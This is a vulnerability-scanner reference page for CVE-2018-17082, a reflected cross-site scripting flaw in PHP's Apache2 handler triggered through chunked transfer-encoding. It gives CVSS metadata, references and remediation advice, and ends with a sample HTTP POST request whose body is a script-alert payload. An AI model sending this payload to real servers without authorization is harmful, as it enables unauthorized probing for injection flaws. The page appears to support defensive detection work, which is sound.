---
layout: post
cve_id: CVE-2018-17082
title: Apache2 - Transfer-Encoding Chunked XSS
pcap: true
pcap_path: /pcaps/2018/CVE-2018-17082.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-17082.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDK
severity: medium
impact: 'Attackers can execute malicious scripts in the context of the affected server,
  leading to potential session hijacking or data theft.

  '
remediation: 'Update to PHP 5.6.38, 7.0.32, 7.1.22, or 7.2.10 or later versions.

  '
reference:
- https://bugs.php.net/bug.php?id=76582
- https://github.com/php/php-src/commit/23b057742e3cf199612fa8050ae86cae675e214e
- https://nvd.nist.gov/vuln/detail/CVE-2018-17082
- https://security.gentoo.org/glsa/201812-01
- https://github.com/ockeghem/web-sec-study/blob/master/why-CVE-2018-17082-is-not-XSS/README.md
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2018-17082
  cwe-id: CWE-79
  epss-score: 0.081
  epss-percentile: 0.91881
  cpe: cpe:2.3:a:php:php:*:*:*:*:*:*:*:*
metadata:
  verified: false
  max-request: 1
  vendor: php
  product: php
tags:
- cve
- cve2018
- php
- apache
- xss
- chunked
---

## üîç Vulnerability Description
Apache2 PHP before 5.6.38, 7.0.x before 7.0.32, 7.1.x before 7.1.22, and 7.2.x before 7.2.10 contain a reflected cross-site scripting vulnerability caused by mishandling of chunked transfer-encoding requests in sapi/apache2handler/sapi_apache2.c. Attackers can execute malicious scripts via crafted requests by sending a specially crafted chunked request.


## üåê HTTP Request
```nohighlight
POST / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Safari/605.1.15
Connection: close
Content-Length: 39
Accept-Encoding: gzip

<script>alert(document.domain)</script>
```

